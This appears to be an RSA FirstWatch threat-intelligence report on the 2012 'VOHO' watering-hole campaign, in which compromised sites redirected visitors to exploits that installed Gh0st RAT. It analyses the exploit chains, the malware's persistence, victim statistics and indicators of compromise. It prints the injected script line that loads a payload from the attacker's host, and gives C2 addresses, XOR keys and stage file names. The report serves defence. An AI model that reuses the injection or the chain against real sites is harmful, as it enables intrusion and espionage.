The team, lead by Will\nGragido, focuses on advanced threat\nresearch and intelligence which\nculminates in threat feeds, digests,\nprofiles and ecosystem analysis\ndesigned to aid the RSA NetWitness[®]\nuser community and the information\nsecurity community at large in\ncontending with these challenges.\n\n\n**In July of 2012, the RSA FirstWatch[SM] research and intelligence team identified an**\n\n**emerging malicious code and content campaign spreading at a rapid rate within very**\n\n**specific geographic theaters. These clusters were confined to ten geographic areas**\n\n**and involved thousands of hosts. To the untrained eye it would appear the hosts**\n\n**involved in this campaign were compromised as the result of innocent web surfing**\n\n**using a common “drive-by” attack mechanism. While at face value this is true, our**\n\n**investigation infers that the populations compromised were not chosen in an**\n\n**indiscriminate manner, but rather with great forethought. Based on the RSA**\n\n**FirstWatch research, we believe these websites were likely chosen with exact**\n\n**precision and great consideration; selected from thousands upon thousands of**\n\n**websites due to familiarity and proximity to the targets of interest that the threat**\n\n**actors responsible for the campaign were truly interested in compromising.**\n\n**The RSA-FirstWatch team’s research led to the identification of this campaign and its**\n\n**name, ‘VOHO’. From a tools, technique and procedure (TTP) perspective, the RSA**\n\n**FirstWatch team believes this campaign aligns with the Advanced Persistent Threat**\n\n**(APT) threat model, including communications emitting from compromised hosts to**\n\n**IP addresses confirmed as Command and Control (C2) servers (in this case, located**\n\n**in Hong Kong); code re-use using exploit scripts and ultimately, a before-unseen**\n\n**variant of “Gh0st RAT” malware. Additionally, targets appeared to be specifically**\n\n**chosen to compromise hosts involved in business and local governments in**\n\n**Washington, DC and Boston, Massachusetts, as well as organizations involved the**\n\n**development and promotion of democratic process in non-permissive regions. As a**\n\n**whole, these specific TTPs have been observed in previous APT attack campaigns,**\n\n**most notably, Aurora[i] and Ghostnet** **[ii].**\n\n**Through our research, the RSA FirstWatch team identified what it believes to be the**\n\n**primary mechanism for tactical and strategic infection of victims affiliated with**\n\n**targets of opportunity. While this attack methodology has been observed before, it**\n\n**has not been widely documented or disseminated. As such, we have termed this**\n\n**technique ‘Water Holing’.**\n\n**The architects of these campaigns survey and select the websites (known as pivot or**\n\n**redirector sites) leveraged in these attacks carefully. Weighing their geographic**\n\n**relevance, proximity to their desired targets of opportunity, and likelihood of being**\n\n**traversed by potential victim-users associated with the attacker objective, the**\n\n**adversary carefully exploits vulnerable systems and inserts malicious scripts to**\n\n**deliver a Trojan payload via browser-based exploits to visitors to the website.**\n\n**Throughout this paper, we will examine the evolution of this threat campaign, its ties**\n\n**to other comparable threat campaigns where variants of the malicious payload seen**\n\n**in this attack (gh0strat) have been identified and chronicled, epicenters of**\n\n**geographic activity associated with this campaign, industry/verticals targeted in this**\n\n**campaign and the construction of the attribution chain.**\n\n\n**Contributing Authors**\n\nAlex Cox, Principal Researcher, RSA\nFirstWatch Team\n\nChris Elisan, Principal Malware\nResearcher, RSA FirstWatch Team\n\nWill Gragido, Sr.Manager, RSA\nFirstWatch Team\n\nChris Harrington, Consulting Security\nEngineer, EMC CIRC\n\nJon McNeill, Principal Technologist, RSA\nFirstWatch Team\n\n\n-----\n\n#### Specifics\n\nUsing the tactic of crafting a “Watering Hole”, the majority of the redirection activity occurred\n\nbecause of JavaScript elements on two specific websites.\n\n   - hxxp://www.xxxxxxxxtrust.com\n\n   - hxxp://xxxxxxcountymd.gov\n\nRespectively, these two sites – one a regional bank in Massachusetts and a local government\n\nserving the Washington DC suburbs.\n\nWe also saw an additional chain of websites with a geopolitical central theme redirecting to the\n\nexploit site:\n\n   - hxxp://ifxx.org\n\n   - hxxp://xxxxxxcenter.org\n\n   - hxxp://xxi.org\n\n   - hxxp://xxxxxxx.prio.no\n\n   - hxxp:/xxxxxxxxpolitics.com\n\n   - hxxp://www.rfxxx.org\n\nAdditionally, sites serving the Defense Industrial Base and Educational community were also\n\nobserved redirecting to the exploit site:\n\n   - hxxp://www.gftxxx.org\n\n   - hxxp://www.xxxxxxantennas.com\n\nWhen taken as a whole, this campaign appears to have targeted:\n\n   - Boston, Massachusetts area users\n\n   - Political Activists\n\n   - Users Washington, DC and its suburbs\n\n   - Defense Industrial Base\n\n   - Education\n\n#### Malicious Infrastructure\n\nHosts visiting the aforementioned sites were redirected to a website of enthusiasts of a lesser\n\nknown sport at the following domain:\n\nhxxp://xxxxxxxcurling.com\n\nThis site attempted to exploit the following host vulnerabilities, in two different attack\n\ncampaigns:\n\n   - Microsoft XML Core Services – CVE-2012-1889\n\n   - Java Exploit – CVE-2012-1723\n\nOnce successfully exploited, the installed “Gh0st RAT” would beacon to one of two IP\n\naddresses:\n\n   - 58.64.155.59\n\n\n-----\n\n#### Exploit Specifics\n\n Attack Methodology Overview\n\n_hxxp://xxxxxxxcurling.com Compromise_\n\nFiles found on the sporting group website indicate that this server was likely compromised with\n\na remote buffer overflow (CVE-2008-3869/CVE-2008-3870) against the server’s sadmind\n\ndaemon. Additional files indicated the ability to establish a remote shell on demand.\n\nIt is unknown if this method was also used to compromise the “watering hole” sites. In these\n\ncases, the following code snipped was added to publically accessible pages on the site,\n\ntypically .js files are used to process a site’s JavaScript:\n\ndocument.write('<script\n\n[src=\"http://www.*******curling.com/Docs/BW06/iframe.js\"></script>');](http://www.*******.com/Docs/BW06/iframe.js)\n\nThis is a simple redirection mechanism that will cause the browser to redirect and load content\n\nfrom the remote site.  Hits to “iframe.js” launch an enumeration and exploit chain that\n\nattempts to exploit two different vulnerabilities,\n\nGh0st RAT is a multiple-purpose remote access tool that allows extensive remote control of\n\ncompromised hosts.  While there is no known evidence linking this attack to previous attacks,\n\ngh0st has historically been used in politically motivated espionage by nation-state attackers, in\n\na similar manner as seen in this campaign depending on the specific redirection path:\n\n   - Microsoft XML Core Services – CVE-2012-1889\n\n   - Java Exploit – CVE-2012-1723\n\n#### Phase 1 - Exploit Chain – Microsoft XML Core Services\n\nFrom our research, this campaign occurred between June 25[th], 2012 and July 18[th] 2012 in\n\nwhich attackers sought to exploit the CVE-2012-1889 vulnerability that was zero-day and was\n\n\nbeing used in targeted attacks as noted in early June[iii]\n\n\n.\n\n\nIn this attack, a successful exploit on CVE-2012-1889 followed the following path:\n\n[Watering Hole Sites]\n\nhttp://xxxxxxcountymd.gov (or other water hole site) \n\nhttp://www.xxxxxxxcurling.com/Results/cx/magma/iframe.js \n\nhttp://www.xxxxxxxcurling.com/Results/cx/magma/module.php \n\nhttp://www.xxxxxxxcurling.com/Results/cx/magma/engine.js \n\nhttp://www.xxxxxxxcurling.com/Results/cx/magma/if.htm \n\nhttp://www.xxxxxxxcurling.com/Results/cx/magma/enblue.htm \n\nhttp://www.xxxxxxxcurling.com/Results/cx/magma/book.cab\n\n\n-----\n\nFigure 1: iFrame.js Flow\n\n\n_Iframe.js_\n\nIframe.js checks if the visiting machine is running a Windows operating system and Internet\nExplorer. It also sets a cookie value (presumably to track individual visits). If the visiting\nmachine is running a Windows operating system and Internet Explorer, it forward to\nmodule.php.\n\n_Module.php_\n\nModule.php uses a simple redirection script to redirect the browser to Engine.js\n\n_Engine.js_\n\nEngine.js looks for processes related to the following antivirus engines using an older\n\nvulnerability in Internet Explorer (CVE-2007-4848) that allows local file enumeration:\n\n   - Trend Micro\n\n   - McAfee\n\n   - Symantec\n\nHowever, the results of this check don’t change the outcome of the script running in all cases;\n\nit simply results in the loading of “if.htm”. We believe this to be a case of existing exploit\n\nscript re-use, with slight changes to suit the attackers current purpose.\n\n\n-----\n\nas detailed here on the contagiodump blog[iv]. Within the blog, noted industry researcher Mila\n\nParkour, cited the presence and use of borrowed scripts having likely originated in Asia,\n\nspecifically the so called xKungfoo script in attacks launched associated with numerous\n\ncampaigns targeted at political dissidents.[v] Additionally, Ms. Parkour has also noted and\n\ndocumented the presence of this weaponizable code in numerous locales on the Internet\n\n\ntoday.[vivii]\n\n\nIn the following figures evidence of the presence and availability of the xKungFoo\n\n\nscript (the script referenced by Mila Parkour and noted as being germane to the RSA\n\nFirstWatch investigation) along with endorsement by the author can be seen:\n\n\nFigure 2: Website Where\nxKungFoo Script Originates\n\n\nFigure 3: Example of xKungFoo\nScript Originates\n\n\nFigure 4: Endorsement by\nAuthor Regarding xKungFoo\n\n\n-----\n\n1) Checks if the visiting host’s user agent reflects is one of the following:\n\n   - Unknown\n\n   - Windows XP\n\n   - Windows 2003\n\n   - Windows VistaWindows 7\n\nChecks if the visiting hosts language settings are:\n\n   - English\n\n   - Chinese\n\n   - French\n\n   - German\n\n   - Japanese\n\n   - Portuguese\n\n   - Korean\n\n   - Russian\n\n_Enblue.htm_\n\nEnblue.htm uses the CVE-2012-1889 XML vulnerability to compromise the visiting browser,\n\nwhich results in a pull and installation of the gh0st RAT malware.\n\nThis script also appears to be code reuse of a script seen on pastebin as follows:\n\n[http://pastebin.com/VfmuhEiq](http://pastebin.com/VfmuhEiq)\n\nInterestingly, this code was also purportedly used in previous nation-state sponsored attacks\n\n\non Gmail accounts[viii]\n\n_Book.cab_\n\n\n.\n\n\nBook.cab, the final payload, is an obfuscated executable which, when de-obfuscated using\n\nXOR 95, is the gh0st RAT sample named “vptray.exe” (e6b43\n\nc299a9a1f5abd9be2b729e54577)\n\n_Phase II - Exploit Chain – Sun Java_\n\nPhase II of this campaign, using the same infrastructure, but with a different directory for the\n\nexploit chain files as follows:\n\n[Watering Hole Sites]\n\nhxxp://xxxxxcountymd.gov (or other water hole site) \n\nhxxp://www.xxxxxxxcurling.com/Docs/BW06/iframe.js \n\nhxxp://www.xxxxxxxcurling.com/Docs/BW06/module.php \n\nhxxp://www.xxxxxxxcurling.com/Docs/BW06/engine.js \n\nhxxp://www.xxxxxxxcurling.com/Docs/BW06/if.htm \n\nhxxp://www.xxxxxxxcurling.com/Docs/BW06/applet.jar\n\n\n-----\n\nFigure 5: Java Exploit Chain\n\n\n_If.htm_\n\nIn this case, all of the scripts were identical up to “if.htm”, which instead contained a java call\n\nthat loaded applet.jar, as well as a large blob of obfuscated code as a “param” element. This\n\nlarge blob of code is a binary obfuscated with XOR 77, which the java applet deobfuscates and\n\nruns as “svohost.exe” (2fe340fe2574ae540bd98bd9af8ec67d).\n\n\nFigure 6: Java Applet Deobfuscates\nand Runs as “svohost.exe”\n\n\n-----\n\n#### “Watering Hole” Specifics\n\nStrategically, the idea of using a target’s interests and likely access points is not a new method\n\nof attack. Undertaking it on such a large scale, however, is notable and unusual in the APT\n\nspace.\n\nIn this campaign, five separate “classes” of sites that were compromised and trojanized to\n\nredirect to the exploit chains on the sporting group website. They were:\n\n   - Sites with Geographic and Target Relevance to the Boston, MA area\n\n   - Sites with Geographic and Target Relevance to Political Activism\n\n   - Sites with Geographic and Target Relevance to the Washington, DC and its suburbs\n\nareas\n\n   - Sites with Geographic and Target Relevance to the Defense Industrial Base\n\n   - Sites with Geographic and Target Relevance to the Education\n\nAdditionally, there were a spattering of non-related sites that appeared to be simple\n\nredirectors to one of the above-categorized sites. This sort of redirector is often used in spam\n\ncampaigns to obfuscate the final location of the exploit server in an attempt to bypass email\n\nmalware controls. While we don’t have specific examples of related spam activity, this seems\n\na likely such use of the additional sites.\n\nOne of the main sources of infection for these campaigns were sites that support the cause of\n\ndemocratic process in non-permissive environments, or the communication of information\n\nrelated to free speech. That is, entities and people that seek to promote democratic\n\ngovernment in countries whose existing political structure and power doesn’t support (and\n\nindeed, persecutes) such governmental change. This particular strategic vector has been\n\nobserved in prior nation-state sponsored attacks.\n\nThough several sites were targeted by the adversarial element behind this campaign some\n\nstood out due to their relationships to matters of geopolitical relevance, philanthropy, and\n\nnews media. Five primary sites were compromised and used as pivot sites from a water holing\n\nperspective in this campaign.  They were largely North American with the exception of one\n\nEuropean example. Additionally, a large percentage of infection activity occurred as a result of\n\nsites compromised and converted into water holes that offered services to the Washington, DC\n\nand Boston, MA areas. As the political and governmental hub of the United States of America,\n\nwholesale compromise of computers in this area would provide a wealth of intelligence for\n\nadversaries interested in political process and government action. Furthermore it should be\n\nnoted that RSA FirstWatch has noted and verified the compromise of nearly one thousand\n\nunique organizations distinct from those noted within this work.\n\n\n-----\n\nFigure 7: Industries and Regions\nLeveraged in “Water Holing” Activity\n\n\n### “Watering Hole” Pivot Sites\n\n\nPolitical\nActivism\n\n\nDefense\nIndustrial\nBase\n\n\n#### Gh0st RAT\n\n RAT Overview\n\nRemote Access Tools\\Trojan (RAT) are typically offered as a “legitimate” remote administration\n\ntool for system administrators, but have largely been used for remote hacking and information\n\ncollection for intelligence purposes or lateral movement activities. While they are similar in\n\nfunction to purpose-built botnets, which also tend to use client/server architecture, RATs\n\ntypically offer a wide range of features rather than the single focus that most modern botnet\n\nmalware adheres to.\n\nTypically, RATs have the ability to:\n\n   - Capture keystrokes\n\n   - Remote monitoring of webcam and/or microphone\n\n   - File system search/browse\n\n   - Use of local command prompt\n\n   - Execution of arbitrary programs\n\n   - File download/upload\n\n#### Gh0st RAT Specifics\n\nGh0st came to prominence following the 2009 publication of “Tracking Ghostnet: Investigating\n\na Cyber Espionage Network”, in which this malware was used to infiltrate computers associated\n\nwith the Dalai Lama and was used to compromise information related to Tibetan affairs.\n\nGh0st contains all of the above-mentioned capabilities when successfully installed on a target\n\nPC.  An excellent overview of this tool can be found in the McAfee report titled “Know your\n\n\nMetro\nWashington,\nDC\n\n   - Government\n\n   - Education\n\n\nDigital Enemy”[ix]\n\n\nMetro\nBoston\n\n    - Financial\nSvcs\n\n\n.\n\n\n-----\n\nFigure 8: Common Technique\nEmpolyed by Gh0st Networks\nOperators\n\n\nSince the publication of this report, the use of gh0st in hacking incidents has exploded, with\n\nthe RSA FirstWatch team being aware of at least 50 unique gh0st networks. This can be\n\nlargely explained, much like the proliferation of ZeuS cybercrime malware, to the open\n\navailability of Gh0st source code on the internet.  When source code for this type of malware\n\nis available globally it allows “open source” evolution of the malware to add new features and\n\ncapabilities, but more importantly, it permits the constant modification of “indicators” used by\n\ndefenders to detect malware activity in their environment.  From an operational sense, having\n\neasy opportunity to modify source code allows a much more robust compromise, with\n\ndecreased likelihood of attacker detection.\n\nIn many cases this detection is based on:\n\n1) Knowledge of known C2 locations\n\n2) Detection of a common “gh0st” string that is seen in the network communication of\n\n“unmodified” gh0st configurations.\n\nA common countermeasure used by operators of gh0st networks is to change this gh0st string\n\nprior to malware compilation to defeat basic IDS signatures.\n\n#### VOHO Sample Analysis\n\n Fake Symantec Update – Variant 1\n\n**VPTray.EXE**\n**e6b43c299a9a1f5abd9be2b729e54577**\n\nThis malware comes in a UPX compressed binary, which disguises itself as an update from\n\nSymantec but instead it installs a backdoor in the target system.\n\nWhen the malware is first executed, its first order of business is to install itself in the system.\n\nIt does this by dropping an exact copy of itself with the name VPTray.EXE in the current user’s\n\n“Local Settings\\Temp” folder. It then modifies the Windows registry for it to autostart every\n\nboot up. It does this by using the following registry keys.\n\n   - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run\n\n   - HKEY_USERS\\<User’s Security ID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run\n\n\n-----\n\nBy using the HKCU and HKU registry hives, the malware is targeting users that are currently\n\nlogged into the machine when the initial infection began instead of the machine itself. This\n\ntechnique is especially useful when the target uses roaming profiles.\n\nThe malware adds the value “SymantecUpdate” to these keys and pass itself off as an update\n\nfrom Symantec. This is a simple technique that is designed to fool the untrained eye. To\n\nreinforce this, the malware employs a certain level of obfuscation to hide the data, which is the\n\nlocation and filename of the malware, by using HEX digits to represent each string characters\n\ninstead of the more common ASCII.\n\nIn this case, instead of the data being:\n\nC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\VPTray.exe\n\nIt is represented in the registry as:\n\n43:3a:5c:44:4f:43:55:4d:45:7e:31:5c:41:44:4d:49:4e:49:7e:31:5c:4c:4f:43:41:4c:53:7e:31\n\n:5c:54:65:6d:70:5c:56:50:54:72:61:79:2e:65:78:65:00.\n\nThis installation technique of dropping an exact copy of itself tells us that the malware can\n\nsurvive and install itself without the aid of a dropper or a downloader. It has the capability to\n\ncheck whether it is running in the appropriate location and if it is properly installed on the\n\nsystem. If not, it proceeds with the installation process. This technique is advantageous if the\n\nmalware has not been removed properly. A surviving main component can recreate what was\n\nremoved including the necessary registry changes needed by the malware.\n\nAside from dropping VPTray.EXE it also drops the binary file UP.BAK in the same “Local\n\nSettings\\Temp” folder. This is the backdoor component of the malware. Once all of these are\n\naccomplished, the original malware passes control to VPTray.EXE and then deletes itself to\n\nremove any traces of its existence.\n\n\nFigure 9: Memory dump of the\nmalware containing the strings of\nthe filenames of the dropped files\nand the registry value.\n\n\n-----\n\nFigure 10: VPTray.exe connecting\nto IP 134.255.242.47.\n\n\nfollowing:\n\n   - Registry Editor is disabled\n\n   - Windows System Restore is disabled\n\nDisabling the registry editor prevents the auditing and review of registry entries, especially\n\nthose that are commonly utilized by malware for persistency while the disabling of Windows\n\nSystem Restore prevents the user from reverting the system to a known good state before\n\ninfection occurred. The malware also wipes out all the restore points that are present in the\n\nsystem before infection.\n\nThe main component, VPTray.EXE, is the one that communicates directly to the botnet\n\ncommand and control. It connects to IP 134.255.242.47 via HTTPS. It remains active in the\n\nsystem listening constantly for instructions while keeping the other components in check.\n\nThe following symptoms can be observed in an infected system:\n\n   - Presence of VPTray.EXE and UP.BAK in the User’s “Local Settings\\Temp” folder. An\n\ninfected Administrator account in Windows XP will have these files in C:\\DOCUMENTS\n\nAND SETTINGS\\ADMINISTRATOR\\LOCAL SETTINGS\\Temp\\\n\n   - Presence of the registry value “SymantecUpdate” with data in HEX values\n\nrepresenting the file and location of VPTray.EXE in the following registry keys:\n\n`o` HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run\n\n`o` HKEY_USERS\\<User’s Security\n\nID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run\n\n   - Presence of running process VPTray.EXE\n\n   - Unable to use the Registry Editor\n\n   - Unable to use Windows System Restore\n\n#### Fake Symantec Update – Variant 2\n\n**Dropper**\n\n**acc583fc596d38626d37cbf6de8a01cb**\n\n**VPTray.EXE**\n\n**b894efe4173f90479fddff455daf6ff3**\n\nUnlike the first variant, this one is not compressed. Both the dropper and the dropped file\n\n(VPTray.EXE) are not compressed. Other difference it has with the first variant is the location\n\nof the dropped file and the way persistency is achieved. But its modus operandi remains the\n\nsame, and that is to pretend to be a Symantec Live Update.\n\nWhen the dropper is executed, it drops VPTray.EXE in C:\\Program Files\\Symantec\\LiveUpdate\\.\n\nHaving these file in a Symantec folder in Program Files is already a red flag especially if the\n\ncompromised machine does not have a Symantec product installed.\n\n\n-----\n\nFigure 11: Memory Dump of the\nMalware Containing the Strings of the\nFilenames\n\n\nIt then adds the registry key below to achieve persistency.\n\n   - Key:HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\run\n\n   - Value: Symantec LiveUpdate\n\n   - Data: C:\\Program Files\\Symantec\\LiveUpdate\\VPTray.exe\n\nObviously, the way it achieves persistency is totally different from variant 1.\n\n   - Variant 2 used a different registry hive\n\n   - Variant 2’s registry value is SymantecLiveUpdate compared to SymantecUpdate in\n\nvariant 1\n\n   - The registry data is in ASCII and not in HEX. This is fine because the malware file is\n\nlocated in a created Symantec folder in Program Files.\n\nTo ensure its survival, the Windows System Restore is disabled. But unlike the first variant,\n\nthis one did not disable the registry editor due to the fact that the added registry value and\n\ndata appears to be legitimate because it utilizes a location of the file that appears to be a\n\nnormal location for a Symantec file.\n\nTo communicate to the attacker the main component, VPTray.EXE, connects to the domain\n\n_usc-data.suroot.com._\n\n\n-----\n\n   - Presence of VPTray.EXE in C:\\Program Files\\Symantec\\LiveUpdate\\\n\n   - Presence of the registry value “SymantecLiveUpdate” with the data “C:\\Program\n\nFiles\\Symantec\\LiveUpdate\\VPTray.EXE” in\n\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\run\n\n   - Presence of running process VPTray.EXE\n\n   - Unable to use Windows System Restore\n\n** As of this writing, the main component, VPTray.EXE, is not detected in VirusTotal using its\n\nhash search function.\n\n#### Fake Microsoft Update\n\n**Svohost.EXE**\n**2fe340fe2574ae540bd98bd9af8ec67d**\n\nSimilar to the Fake Symantec Update, this malware comes in a UPX compressed binary file. It\n\npasses itself off as a Microsoft update but nothing can be further from the truth.\n\nWhen the malware is first executed, it installs itself in the system similar to the method\n\nemployed by the Fake Symantec Update. The only difference is the file that is dropped and\n\nregistry value and data it uses. The file is dropped in the current user’s “Local Settings\\Temp”\n\nfolder and is named SVOHOST.EXE, which is an exact copy of the malware. This technique of\n\nnaming a file almost similar to a legitimate file (SVCHOST.EXE) is known as homographic\n\nobfuscation. But in this case, the less elegant method is used, and that is to simply replace one\n\nletter with another. To autostart, the malware utilized the same registry keys as the Fake\n\nSymantec Update.\n\n   - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run\n\n   - HKEY_USERS\\<User’s Security ID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run\n\nBy using these registry hives, the malware is able to target users that are currently logged into\n\nthe machine even those that are not currently active in the system (think of Switch User mode).\n\nThe malware adds the value “Microsoft Update” to these keys. A common technique, a very\n\ntypical malware deception, to fool users into believing it is something that it is not. Aside from\n\nthis, it also utilizes HEX digits to obfuscate the registry data, which represents the location and\n\nthe filename of the malware.\n\nSo instead of the data being C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\svohost.exe for an\n\ninfected Administrator account in Windows XP, it appears as\n\n43:3a:5c:44:4f:43:55:4d:45:7e:31:5c:41:44:4d:49:4e:49:7e:31:5c:4c:4f:43:41:4c:53:7e:31\n\n:5c:54:65:6d:70:5c:73:76:6f:68:6f:73:74:2e:65:78:65:00.\n\nOnce all the malware installation procedure is done, the original malware passes control to\n\nSVOHOST.EXE and deletes itself to hide any traces of its existence.\n\nOnce the malware is active in the system it utilizes certain protective mechanisms such as the\n\nfollowing:\n\n   - Registry Editor is disabled\n\n   - Windows System Restore is disabled\n\n\n-----\n\nFigure 12: SVOHOST.EXE\nconnecting to 58.64.155.59.\n\n\nthose that are commonly utilized by malware for persistency while the disabling of Windows\n\nSystem Restore prevents the user from reverting the system to a known good state before\n\ninfection occurred. The malware also wipes out all the restore points that are present in the\n\nsystem before infection. To communicate to the attacker, the malware connects to IP\n\n58.64.155.59.\n\nThe following symptoms can be observed in an infected system.\n\n   - Presence of SVOHOST.EXE in the User’s “Local Settings\\Temp” folder. An infected\n\nAdministrator account in Windows XP will have these files in C:\\DOCUMENTS AND\n\nSETTINGS\\ADMINISTRATOR\\LOCAL SETTINGS\\Temp\\\n\n   - Presence of the registry value “Microsoft Update” with data in HEX values representing\n\nthe file and location of SVOHOST.EXE in the following registry keys:\n\n`o` HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run\n\n`o` HKEY_USERS\\<User’s Security\n\nID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run\n\n   - Presence of running process SVOHOST.EXE\n\n   - Unable to use the Registry Editor\n\n   - Unable to use Windows System Restore\n\n#### VOHO Campaign Analysis\n\nRSA FirstWatch research examined HTTP logs covering the June/July 2012 timeframe for the\n\nexploit chain in this example. This analysis, combined with a detailed understanding of the\n\nexploit mechanism, allowed the team to get a better understanding of the scope of\n\ncompromise of this campaign.\n\nBased on our analysis, we can determine that this attack was broken up into two phases.\n\n#### Phase 1\n\nWe observed referral traffic begin on June 25, 2012 to the exploit site. However, according to\n\nthe server logs, actual exploitation of Internet Explorer began on July 9, 2012 at approximately\n\n7:56 AM EST when the first successful exploits of visiting browsers began to hit the exploit\n\ncode. We observed some movement of exploit code across directories on the\n\n*******curling.com web server during the investigation, so this gap was likely caused by the\n\nattacker setting up a new campaign. Phase 1 exploit activity continued over the course of two\n\ndays, with continuous access, until July 10th, when activity stopped at 3:43 pm EST.\n\n#### Phase 2\n\nPhase 2, which consisted of the above mentioned attack on the Sun Java client, began on July\n\n16, 2012, when the first successful exploits of visiting java clients began to hit the exploit\n\nserver at approximately 7:46am EST. This exploit activity continued over the course of a few\n\ndays, and ceased on July 18, 2012, at approximately 9:12 am EST, which was when the server\n\nadministrator of *******curling.com brought the server down for compromise remediation.\n\n\n-----\n\nBased on our analysis, a total of 32,160 unique hosts, representing 731 unique global\n\norganizations, were redirected from compromised web servers injected with the redirect iframe\n\nto the exploit server. Of these redirects, 3,934 hosts were seen to download the exploit CAB\n\nand JAR files (indicating a successful exploit/compromise of the visiting host). This gives a\n\n“success” statistic of 12%, which based on our previous understanding of exploit campaigns,\n\nindicates a very successful campaign.\n\n### Total Exposure and Compromise\nFigure 13: Success of Compromise\n\n##### 35,000\n\n 30,000\n\n 25,000\n\n 20,000\n\n 15,000\n\n 10,000\n\n 5,000\n\n 0\n Total Exposure by Redirect Total Compromises\n\nOf the listed sites used to redirect hosts to the exploit site, the top four redirecting web servers\n\nare as follows:\n\n\nFigure 14: Top Four Redirect Sites\n\n\nWith success rates per exploit type being split pretty much down the middle:\n\n\n-----\n\nFigure 15: Exploit Breakdown\n\n\n### Exploit Breakdown\n\nCAB Downloads\n\nJAR Downloads\n\n\n#### Exploited Organization Breakdown\n\nOf the hosts above that downloaded the exploit CAB and JAR files, the RSA FirstWatch team\n\nfurther examined compromised organizations by identifying the visiting hosts and cross\nreferencing the IP addresses to the Autonomous Systems that they belonged to.\n\n_CAVEAT: Because we didn’t have observation of the compromised host themselves, nor_\n\n_command and control traffic, our understanding of “compromise” is strictly-related to observed_\n\n_HTTP traffic. This analysis would not take into account host or perimeter-based blocking_\n\n_systems at affected organizations._\n\nWith this data we then grouped those autonomous systems into the following industries:\n\n   - **Corporate – These systems were identified as being members of typical corporate**\n\nnetworks, which included enterprises and business, as well as “business-class” IP\n\nspace in large ISP organizations.\n\n   - **Defense Industrial Base (DIB) – These systems were systems in ASNs that were**\n\nknown to be involved with DIB consulting, systems and process.\n\n   - **Local Government – These systems were systems in networks identified as**\n\ngovernment systems in various cities, counties and towns.\n\n   - **Internet Service Provider (ISP) - These systems were hosts in networks that were**\n\nidentified as common internet service provider space. This particular classification\n\naccounts largely for consumer-based internet users, but may also include corporate\n\nassets that aren’t immediately identifiable by ASN examination.\n\n   - **Federal Government – These systems are hosts in U.S. Government IP space or**\n\nWashington DC area local government space. This would include Federal agencies\n\nand support organizations.\n\n   - **Educational Institutions (EDU) – These systems were hosts in networks identified**\n\nas educational institutions. Much like ISP traffic, this traffic is difficult to breakdown\n\ninto more specific identifying information.\n\n   - **Financial Services Organizations – These systems were systems in identifiable**\n\nBank, Credit Union, Trading and other organizations related to financial services.\n\n   - **Healthcare - These systems were hosts in identifiable healthcare industry space.**\n\nThis would include hospital, pharmaceutical, patient services and clinic space.\n\n   - **Other Government – These systems were national government systems identified in**\n\nforeign IP space or global government organizations (example: United Nations)\n\n   - **Utilities / SCADA - These systems were hosts identified in organizations that supply**\n\nor support utility or SCADA-related services such as Energy and water services.\n\n\n-----\n\nFigure 16: Compromises by Industry\n\n\nFigure 17: Compromise by Industry\nwithout ISP\n\n\nBy removing ISP traffic, we are better able to examine the other industries:\n\n### Compromise By Industry (without ISP)\n\nUTILITIES / SCADA\n\nOTHER GOVT\n\nLOCAL GOVT\n\nHEALTHCARE\n\nFINANCIAL\n\nFED GOVT\n\nEDU\n\nDIB\n\nCORPORATE\n\n##### 0 200 400 600 800\n\n#### Linked Campaigns\n\n Wsdhealthy.com[xxixii]\n\nBased on our understanding of this campaign and TTPs (tools, techniques and procedures)\n\nused, we believe the following malware samples observed in January 2012 are related and\n\nbelong to the same threat actors.\n\n**03db29c71b0031af08081f5e2f7dcdf2**\n\n**644161889f0f60885b2a0eec12038b66**\n\n\n-----\n\nfollowing DNS names in the past:\n\n**usc-data.suroot.com**\n\n**usa-mail.scieron.com**\n\n**dll.freshdns.org**\n\nDelivery of these samples appeared to be a similar attack vector, that being a hacked server\n\nthat was redirected to by iframe insertion:\n\n**www.wsdhealthy.com**\n\nUsing the following URLs:\n\nwww.wsdhealthy.com/userfiles/file/Applet19.html\n\nwww.wsdhealthy.com/userfiles/file/Applet19.exe\n\nwww.wsdhealthy.com/userfiles/file/Applet.html\n\nwww.wsdhealthy.com/userfiles/file/Applet.jar\n\nwww.wsdhealthy.com/userfiles/file/Applet.exe\n\nThis file structure indicates a similar java exploitation, and while we didn’t have direct\n\nobservation of this campaign, open source intelligence indicates a possible exploit of:\n\nCVE–2011-3544 - Unspecified vulnerability in the Java Runtime Environment\n\nAdditionally, the Gh0st RAT variant used in this campaign matched identifiers used in the\n\nVOHO campaign.\n\n#### Detection and Indicators of Compromise\n\n_Network_\n\nFor network detection of this threat, users should look for historic traffic to the following IPs\n\nand Domains:\n\n_IP Addresses_\n\n58.64.155.59 (gh0st RAT C2)\n\n58.64.155.57 (gh0st RAT C2)\n\n58.64.143.245 (gh0st RAT C2)\n\n_Domains_\n\nwsdhealthy.com (legitimate site hosting exploit code/malware)\n\n*******curling.com (legitimate site hosting exploit code/malware)\n\nusc-data.suroot.com (gh0st RAT C2)\n\nusa-mail.scieron.com (gh0st RAT C2)\n\ndll.freshdns.org (gh0st RAT C2)\n\n\n-----\n\n_Gh0st RAT_\n\nGenerically, gh0st RAT communication using the unmodified source code can be detected by\n\nlooking for non-RFC compliant network traffic on allowed paths, which contain the string\n\n“Gh0st” in the first view five bytes of the packet payload. Because this is a commonly used\n\ntactic to detect Gh0st on the network, attackers often change this string to avoid detection. In\n\nthe case of the VOHO compromise, this indicator is “HTTPS”.\n\n_Known Malicious MD5 Hashes_\n\n03db29c71b0031af08081f5e2f7dcdf2\n\n644161889f0f60885b2a0eec12038b66\n\ne6b43c299a9a1f5abd9be2b729e54577\n\n2fe340fe2574ae540bd98bd9af8ec67d\n\n_RSA NetWitness Indicators_\n\nip.dst = 58.64.155.59,58.64.155.57,58.64.143.245,64.26.174.74 || alias.host 